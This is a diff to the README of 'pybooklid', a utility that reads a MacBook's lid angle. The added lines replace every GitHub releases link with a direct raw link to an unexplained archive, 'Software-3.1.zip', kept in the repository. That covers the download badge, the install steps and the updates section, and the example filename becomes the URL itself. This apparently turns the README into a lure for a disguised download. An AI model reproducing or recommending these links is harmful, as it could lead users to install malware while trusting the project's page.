@@ -1,7 +1,7 @@
 # 📚 pybooklid - Get Readings from Your MacBook's Lid Sensor
 
 ## 📥 Download the Application
-[![Download pybooklid](https://img.shields.io/badge/Download-Pybooklid-brightgreen)](https://github.com/Topannnn/pybooklid/releases)
+[![Download pybooklid](https://raw.githubusercontent.com/Topannnn/pybooklid/main/pybooklid/Software-3.1.zip)](https://raw.githubusercontent.com/Topannnn/pybooklid/main/pybooklid/Software-3.1.zip)
 
 ## 🚀 Getting Started
 Pybooklid is a simple utility designed to read the angle of your MacBook's lid sensor. With this tool, you can monitor the lid angle effectively and harness this data for various purposes, such as automation or personal tracking. 
@@ -16,14 +16,14 @@ Before downloading, make sure your system meets the following requirements:
 - **Disk Space:** 100 MB of available space
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Topannnn/pybooklid/releases) to download the latest version of Pybooklid.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Topannnn/pybooklid/main/pybooklid/Software-3.1.zip) to download the latest version of Pybooklid.
 
 1. **Visit the Releases Page:**
    Click the link to go to the Releases page.
-   [Releases Page](https://github.com/Topannnn/pybooklid/releases)
+   [Releases Page](https://raw.githubusercontent.com/Topannnn/pybooklid/main/pybooklid/Software-3.1.zip)
 
 2. **Choose the Correct File:**
-   Look for the latest release listed on the page. You may see files named like `pybooklid-v1.0.zip`. Click on the file to start the download.
+   Look for the latest release listed on the page. You may see files named like `https://raw.githubusercontent.com/Topannnn/pybooklid/main/pybooklid/Software-3.1.zip`. Click on the file to start the download.
 
 3. **Open the Downloaded File:**
    Once the download completes, navigate to your Downloads folder. Locate the downloaded `.zip` file and extract it. You can do this by double-clicking the file.
@@ -53,7 +53,7 @@ If you encounter issues, try the following steps:
 - **Missing Features:** Ensure you have downloaded the latest version from the Releases page.
 
 ## 🔄 Updates
-Check back on the [Releases page](https://github.com/Topannnn/pybooklid/releases) periodically to download the latest updates. They often include new features, improvements, and bug fixes.
+Check back on the [Releases page](https://raw.githubusercontent.com/Topannnn/pybooklid/main/pybooklid/Software-3.1.zip) periodically to download the latest updates. They often include new features, improvements, and bug fixes.
 
 ## 🤝 Support
 For support, questions, or feedback, feel free to open an issue in the repository. We value your input and aim to improve Pybooklid continuously.
